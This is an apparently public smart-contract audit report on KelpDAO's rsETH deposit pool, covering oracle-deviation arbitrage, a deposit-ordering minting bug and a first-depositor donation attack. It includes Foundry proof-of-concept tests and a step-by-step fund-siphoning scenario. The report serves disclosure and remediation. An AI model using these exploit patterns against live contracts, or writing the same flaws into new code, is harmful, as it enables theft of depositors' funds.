[H-01] Possible arbitrage from Chainlink price discrepancy
Submitted bym_Rassska, also found bySBSecurity,Aamir,d3e4,adriro,CatsSecurity,jayfromthe13th,Bauchibred,deth,0xDING99YA,HChang26,almurhasan,PENGUN,anarcheuz, andcirclelooper
Some theory needed
Currently KelpDAO relies on the following chainlink price feeds in order to calculate rsETH/ETH exchange rate:
Price FeedDeviationHeartbeat1rETH/ETH2%86400s2cbETH/ETH1%86400s3stETH/ETH0.5%86400s
As we can see, an acceptable deviation for rETH/ETH price feed is about[-2% 2%], meaning that the nodes will not update an on-chain price, in case the boundaries are not reached within the 24h period. These deviations are significant enough to open an arbitrage opportunities which will impact an overall rsETH/ETH exchange rate badly.For a further analysis we have to look at the current LSD market distribution, which is represented here:
LSDStaked ETHMarket ShareLRTDepositPool ratio1Lido8.95m~77.35%~88.17%2Rocket Pool1.01m~8.76%~9.95%3Coinbase190.549~1.65%~1.88%
WhereLRTDepositPool ratiois an approximate ratio of deposited lsts based on the overall LSD market.
An example of profitable arbitrage
Seeoriginal submissionfor full details.
Final words
Basically, price feeds don’t have to reach those extreme boundaries in order to profit from it. In theory presented above we were able to get +2.3% profit, which is significant in case there is a huge liquidity supplied. The combination of deviations might be absolutely random, since it operates in set of rational numbers. But it will constantly open a small [+1%; +1.5%] arbitrage opportunities to be exploited.
Proof on Concept
To reproduce the case described above, slightly change:LRTOracleMock:contractLRTOracleMock{uint256publicprice;constructor(uint256_price) {price=_price;}functiongetAssetPrice(address)externalviewreturns(uint256) {returnprice;}functionsubmitNewAssetPrice(uint256_newPrice)external{price=_newPrice;}}setUp():contractLRTDepositPoolTestisBaseTest,RSETHTest{LRTDepositPoolpubliclrtDepositPool;functionsetUp()publicvirtualoverride(RSETHTest,BaseTest) {super.setUp();// deploy LRTDepositPoolProxyAdminproxyAdmin=newProxyAdmin();LRTDepositPoolcontractImpl=newLRTDepositPool();TransparentUpgradeableProxycontractProxy=newTransparentUpgradeableProxy(address(contractImpl),address(proxyAdmin),"");lrtDepositPool=LRTDepositPool(address(contractProxy));// initialize RSETH. LRTCOnfig is already initialized in RSETHTestrseth.initialize(address(admin),address(lrtConfig));vm.startPrank(admin);// add rsETH to LRT configlrtConfig.setRSETH(address(rseth));// add oracle to LRT configlrtConfig.setContract(LRTConstants.LRT_ORACLE,address(newLRTOracle()));lrtConfig.setContract(LRTConstants.LRT_DEPOSIT_POOL,address(lrtDepositPool));LRTOracle(lrtConfig.getContract(LRTConstants.LRT_ORACLE)).initialize(address(lrtConfig));lrtDepositPool.initialize(address(lrtConfig));// add minter role for rseth to lrtDepositPoolrseth.grantRole(rseth.MINTER_ROLE(),address(lrtDepositPool));}}test_DepositAsset():functiontest_DepositAsset()external{addressrETHPriceOracle=address(newLRTOracleMock(1.09149e18));addressstETHPriceOracle=address(newLRTOracleMock(0.99891e18));addresscbETHPriceOracle=address(newLRTOracleMock(1.05407e18));LRTOracle(lrtConfig.getContract(LRTConstants.LRT_ORACLE)).updatePriceOracleFor(address(rETH),rETHPriceOracle);LRTOracle(lrtConfig.getContract(LRTConstants.LRT_ORACLE)).updatePriceOracleFor(address(stETH),stETHPriceOracle);LRTOracle(lrtConfig.getContract(LRTConstants.LRT_ORACLE)).updatePriceOracleFor(address(cbETH),cbETHPriceOracle);console.log("rETH/ETH exchange rate after",LRTOracleMock(rETHPriceOracle).getAssetPrice(address(0)));console.log("stETH/ETH exchange rate after",LRTOracleMock(stETHPriceOracle).getAssetPrice(address(0)));console.log("cbETH/ETH exchange rate after",LRTOracleMock(cbETHPriceOracle).getAssetPrice(address(0)));vm.startPrank(alice);// alice provides huge amount of liquidity to the poolrETH.approve(address(lrtDepositPool),9950ether);lrtDepositPool.depositAsset(rETHAddress,9950ether);stETH.approve(address(lrtDepositPool),88170ether);lrtDepositPool.depositAsset(address(stETH),88170ether);cbETH.approve(address(lrtDepositPool),1880ether);lrtDepositPool.depositAsset(address(cbETH),1880ether);vm.stopPrank();vm.startPrank(carol);// carol deposits, when the price feeds return answer pretty close to a spot priceuint256carolBalanceBefore=rseth.balanceOf(address(carol));rETH.approve(address(lrtDepositPool),100ether);lrtDepositPool.depositAsset(address(rETH),100ether);uint256carolBalanceAfter=rseth.balanceOf(address(carol));vm.stopPrank();uint256rETHNewPrice=uint256(LRTOracleMock(rETHPriceOracle).getAssetPrice(address(0))) *102/100;// +2%uint256stETHNewPrice=uint256(LRTOracleMock(stETHPriceOracle).getAssetPrice(address(0))) *995/1000;// -0.5%uint256cbETHNewPrice=uint256(LRTOracleMock(cbETHPriceOracle).getAssetPrice(address(0))) *99/100;// -1%LRTOracleMock(rETHPriceOracle).submitNewAssetPrice(rETHNewPrice);LRTOracleMock(stETHPriceOracle).submitNewAssetPrice(stETHNewPrice);LRTOracleMock(cbETHPriceOracle).submitNewAssetPrice(cbETHNewPrice);console.log("rETH/ETH exchange rate after",LRTOracleMock(rETHPriceOracle).getAssetPrice(address(0)));console.log("stETH/ETH exchange rate after",LRTOracleMock(stETHPriceOracle).getAssetPrice(address(0)));console.log("cbETH/ETH exchange rate after",LRTOracleMock(cbETHPriceOracle).getAssetPrice(address(0)));vm.startPrank(bob);// bob balance of rsETH before deposituint256bobBalanceBefore=rseth.balanceOf(address(bob));rETH.approve(address(lrtDepositPool),100ether);lrtDepositPool.depositAsset(address(rETH),100ether);uint256bobBalanceAfter=rseth.balanceOf(address(bob));vm.stopPrank();assertEq(bobBalanceBefore,carolBalanceBefore,"the balances are not the same");assertGt(bobBalanceAfter,carolBalanceAfter*102/100,"some random shit happened");assertLt(bobBalanceAfter,carolBalanceAfter*103/100,"some random shittttt happened");}
Recommended Mitigation Steps
Short term:
N/A
Long term:
I was thinking about utilizing multiple price oracles, which could potentially close any profitable opportunities, but the gas overhead and overall complexity grows rapidly. Unfortunately, I don’t have anything robust to offer by now, but open to discuss about it.
Assessed type
Math
gus (Kelp) disputed and commented:
We appreciate the explanation at length you have here. We see the arbitrage as a feature rather than a bug in the system. The past 2 year data on the price discrepancy assures us that this is a minor vector that will not impact deposits or withdraws significantly. Moreover, the fact that minters earn nominally more and withdrawals earn nominally less balances the system. We also want to call out that price arbitrage is not a unique problem to our design. It is virtually present across every staking protocol and we encourage healthy arbitrage opportunity here.
0xDjango (judge) commented:
This is valid. Depositors will be able to deposit the minimally-priced asset and steal value from the deposit pool. The deviation % and heartbeat are too large and this will open up arbitrage opportunities to the detriment of Kelp’s users. When Kelp implements the withdrawal mechanism, we will have a better understanding of the profitability of such an attack. For example, if Kelp implements withdrawals without a staking delay, given the large amount of on-chain liquidity of the underlying assets, the pool may be able to be exploited for large amounts given even a 1% price discrepancy between the different LSTs.
Note: seeoriginal submissionfor full discussion.

[H-02] Protocol mints less rsETH on deposit than intended
Submitted byT1MOH, also found by0xepley,SBSecurity,cryptothemex,adriro,AlexCzm,trachev,adam-idarrha,Aymen0909,deepplus,xAriextz,ast3ros,Weed0607,DanielArmstrong,rouhsamad,osmanozdemir1,GREY-HAWK-REACH,0x1337,zhaojie,Jiamin,crunch,Varun_05,7siech,QiuhaoLi,circlelooper,HChang26,Juntao,ayden,Aamir,rvierdiiev,max10afternoon,crack-the-kelp,Ruhum,0xluckhu,0xNaN,mahdirostami, and0xmystery
Price of rsETH is calculated astotalLockedETH / rsETHSupply. rsETH price is used to calculate rsETH amount to mint when user deposits. Formulas are following:
rsethAmountToMint = amount * assetPrice / rsEthPricersEthPrice = totalEthLocked / rsETHSupply
Problem is that it transfers deposit amount before calculation ofrsethAmountToMint. It increasestotalEthLocked. As a result rsethAmountToMint is less than intended because rsEthPrice is higher.
For example:
SupposetotalEthLocked= 10e18, assetPrice = 1e18, rsETHSupply = 10e18User deposits 30e18. He expects to receive 30e18 rsETHHowever actual received amount will be30e18 * 1e18 / ((30e18 * 1e18 + 10e18 * 1e18) / 10e18) = 7.5e18
Proof of Concept
Here you can see that it firstly transfers asset toaddress(this), then calculates amount to mint:
functiondepositAsset(addressasset,uint256depositAmount)externalwhenNotPausednonReentrantonlySupportedAsset(asset){...if(!IERC20(asset).transferFrom(msg.sender,address(this),depositAmount)) {revertTokenTransferFailed();}// interactionsuint256rsethAmountMinted=_mintRsETH(asset,depositAmount);emitAssetDeposit(asset,depositAmount,rsethAmountMinted);}
There is long chain of calls:
_mintRsETH()getRsETHAmountToMint()LRTOracle().getRSETHPrice()getTotalAssetDeposits()getTotalAssetDeposits()
FinallygetTotalAssetDeposits()uses currentbalanceOf(), which was increased before by transferring deposit amount:
functiongetAssetDistributionData(addressasset)publicviewoverrideonlySupportedAsset(asset)returns(uint256assetLyingInDepositPool,uint256assetLyingInNDCs,uint256assetStakedInEigenLayer){// Question: is here the right place to have this? Could it be in LRTConfig?@>assetLyingInDepositPool=IERC20(asset).balanceOf(address(this));uint256ndcsCount=nodeDelegatorQueue.length;for(uint256i;i<ndcsCount;) {assetLyingInNDCs+=IERC20(asset).balanceOf(nodeDelegatorQueue[i]);assetStakedInEigenLayer+=INodeDelegator(nodeDelegatorQueue[i]).getAssetBalance(asset);unchecked{++i;}}}
Recommended Mitigation Steps
Transfer tokens in the end:
function depositAsset(address asset,uint256 depositAmount)externalwhenNotPausednonReentrantonlySupportedAsset(asset){...+       uint256 rsethAmountMinted = _mintRsETH(asset, depositAmount);if (!IERC20(asset).transferFrom(msg.sender, address(this), depositAmount)) {revert TokenTransferFailed();}-       // interactions-       uint256 rsethAmountMinted = _mintRsETH(asset, depositAmount);-emit AssetDeposit(asset, depositAmount, rsethAmountMinted);}
Assessed type
Oracle
RaymondFam (lookout) commented:
This vulnerability is worse than a donation attack.
gus (Kelp) confirmed and commented:
This is a legitimate issue and has been fixed in commit 3b4e36c740013b32b78e93b00438b25f848e5f76 to separately have rsETH price calculators and read value from state variables, which also helped reduce gas cost to a great extent as well. We thank the warden for alerting us to this issue.
0xDjango (judge) commented:
This is a High severity issue. The miscalculation causes direct fund loss to users.

[H-03] The price of rsETH could be manipulated by the first staker
Submitted byKrace, also found bySBSecurity,spark,adriro,Madalad,peanuts,adam-idarrha,Phantasmagoria,Aymen0909,CatsSecurity,SandNallani,chaduke,AlexCzm,deth,bronze_pickaxe,osmanozdemir1,ast3ros,zach,m_Rassska,jasonxiale,mahyar,pep7siup,twcctop,ck,joaovwfreire,GREY-HAWK-REACH,0xDING99YA,zhaojie,qpzm,TheSchnilch,gumgumzum,QiuhaoLi,0xrugpull_detector,Aamir,almurhasan,ayden,wisdomn_,peter,max10afternoon,rouhsamad,SpicyMeatball,rvierdiiev,crack-the-kelp,Ruhum,ke1caM,ptsanev,mahdirostami,Banditx0x,critical-or-high,T1MOH,ubl4nk,Bauer, andbtk
https://github.com/code-423n4/2023-11-kelp/blob/c5fdc2e62c5e1d78769f44d6e34a6fb9e40c00f0/src/LRTDepositPool.sol#L95-L110https://github.com/code-423n4/2023-11-kelp/blob/c5fdc2e62c5e1d78769f44d6e34a6fb9e40c00f0/src/LRTOracle.sol#L52-L79
The first staker can potentially manipulate the price of rsETH through a donation attack, causing subsequent stakers to receive no rsETH after depositing. The first staker can exploit this method to siphon funds from other users.
Proof of Concept
The mining amount of rsETH is calculated in functiongetRsETHAmountToMintwhich directly utilizes the total value of the asset divided by the price of a single rsETH.
functiongetRsETHAmountToMint(addressasset,uint256amount)publicviewoverridereturns(uint256rsethAmountToMint){// setup oracle contractaddresslrtOracleAddress=lrtConfig.getContract(LRTConstants.LRT_ORACLE);ILRTOraclelrtOracle=ILRTOracle(lrtOracleAddress);// calculate rseth amount to mint based on asset amount and asset exchange ratersethAmountToMint= (amount*lrtOracle.getAssetPrice(asset)) /lrtOracle.getRSETHPrice();}
Subsequently, the price of rsETH is related to its totalSupply and the total value of deposited assets.
functiongetRSETHPrice()externalviewreturns(uint256rsETHPrice) {addressrsETHTokenAddress=lrtConfig.rsETH();uint256rsEthSupply=IRSETH(rsETHTokenAddress).totalSupply();if(rsEthSupply==0) {return1ether;}uint256totalETHInPool;addresslrtDepositPoolAddr=lrtConfig.getContract(LRTConstants.LRT_DEPOSIT_POOL);address[]memorysupportedAssets=lrtConfig.getSupportedAssetList();uint256supportedAssetCount=supportedAssets.length;for(uint16asset_idx;asset_idx<supportedAssetCount;) {addressasset=supportedAssets[asset_idx];uint256assetER=getAssetPrice(asset);uint256totalAssetAmt=ILRTDepositPool(lrtDepositPoolAddr).getTotalAssetDeposits(asset);totalETHInPool+=totalAssetAmt*assetER;unchecked{++asset_idx;}}//@audit the price of rsETH is calculated based on the asset and totalSupplyreturntotalETHInPool/rsEthSupply;}
The total value of deposited assets comprises three parts: the assets inLRTDepositPool, the assets inNodeDelagator, and the assets in the eigenlayer. Anyone can directly contribute asset tokens toLRTDepositPoolorNodeDelegatorto augment the total value of deposited assets.
functiongetAssetDistributionData(addressasset)publicviewoverrideonlySupportedAsset(asset)returns(uint256assetLyingInDepositPool,uint256assetLyingInNDCs,uint256assetStakedInEigenLayer){// Question: is here the right place to have this? Could it be in LRTConfig?assetLyingInDepositPool=IERC20(asset).balanceOf(address(this));uint256ndcsCount=nodeDelegatorQueue.length;for(uint256i;i<ndcsCount;) {assetLyingInNDCs+=IERC20(asset).balanceOf(nodeDelegatorQueue[i]);assetStakedInEigenLayer+=INodeDelegator(nodeDelegatorQueue[i]).getAssetBalance(asset);unchecked{++i;}}}
Case
Therefore, the price of rsETH is susceptible to manipulation by the first staker, considering the following scenario:
Alice is the first staker and she deposits 1 USDC (the price of USDC is set to $1), she will get 1 wei rsETH, and the totalSupply of rsETH is 1 wei.
Here is the test, add it totest/LRTDepositPoolTest.t.soland run withforge test --match-test test_ControlPrice -vv.
diff --git a/test/LRTDepositPoolTest.t.sol b/test/LRTDepositPoolTest.t.solindex 40abc93..63349c2 100644--- a/test/LRTDepositPoolTest.t.sol+++ b/test/LRTDepositPoolTest.t.sol@@ -9,10 +9,11 @@ import { ILRTDepositPool } from "src/interfaces/ILRTDepositPool.sol";import { TransparentUpgradeableProxy } from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";import { ProxyAdmin } from "@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol";+import "forge-std/console.sol";contract LRTOracleMock {function getAssetPrice(address) external pure returns (uint256) {-        return 1e18;+        return 1;}function getRSETHPrice() external pure returns (uint256) {@@ -109,6 +110,23 @@ contract LRTDepositPoolDepositAsset is LRTDepositPoolTest {lrtDepositPool.depositAsset(rETHAddress, 2 ether);}+    function test_ControlPrice() external {+        vm.startPrank(alice);++        // alice balance of rsETH before deposit+        uint256 aliceBalanceBefore = rseth.balanceOf(address(alice));++        rETH.approve(address(lrtDepositPool), 1 ether);+        lrtDepositPool.depositAsset(rETHAddress, 1 ether);++        // alice balance of rsETH after deposit+        uint256 aliceBalanceAfter = rseth.balanceOf(address(alice));+        vm.stopPrank();++        console.log(" rsETH of Alice: ", aliceBalanceAfter - aliceBalanceBefore);++    }+function test_DepositAsset() external {vm.startPrank(alice);
Alice donates 10000 USDC to theLRTDepositPoolto inflate the price of rsETH. Now the price of rsETH is: (10000 + 1)ether / 1 wei = 10001 etherAny subsequent staker who deposits assets worth less than 10001 USDC will not receive any rsETH, and they won’t be able to withdraw the deposited assets either. Alice can directly siphon off these funds.
For example, if Bob deposit 10000 USDC, then thersethAmountToMintis(10000 ether * 1) / (10001)ether = 0
rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.getRSETHPrice();
Moreover, there is no check on the actual amount of rsETH received by the user, and the execution continues even if this amount is zero.
function _mintRsETH(address _asset, uint256 _amount) private returns (uint256 rsethAmountToMint) {(rsethAmountToMint) = getRsETHAmountToMint(_asset, _amount);address rsethToken = lrtConfig.rsETH();// mint rseth for user//@audit sender could receive 0 tokenIRSETH(rsethToken).mint(msg.sender, rsethAmountToMint);}
Recommended Mitigation Steps
It is recommended to pre-mint some rsETH tokens to prevent price manipulation or ensure that thersethAmountToMintis greater than zero.
gus (Kelp) disagreed with severity and commented:
We agree this is an issue. We also agree that it should be of a MEDIUM severity as it is an edge case that happens on the first protocol interaction.
manoj9april (Kelp) confirmed
0xDjango (judge) commented:
Judging as HIGH. While it is an edge case, the potential loss of funds is present. Vault donation attacks have been judged as high in the majority of C4 audits where no safeguards are implemented.
manoj9april (Kelp) commented:
Initial minting is a way of mitigating this issue. And this mitigation could be done after deployment. Hence no safeguard were added in contract. Hence request to decrease to medium.
0xDjango (judge) commented:
Initial minting is a way of mitigating this issue. And this mitigation could be done after deployment. Hence no safeguard were added in contract. Hence request to decrease to medium.Based on the implementation, this issue will remain HIGH. Funds are at risk until Kelp takes subsequent action to mitigate.
gus (Kelp) confirmed and commented:
We disagree with the severity of this issue. Every protocol has to setup the contracts first before publicizing that contracts are ready for public usage. We take measures to ensure the exchange rate is closer to 1 before users interact with contracts.

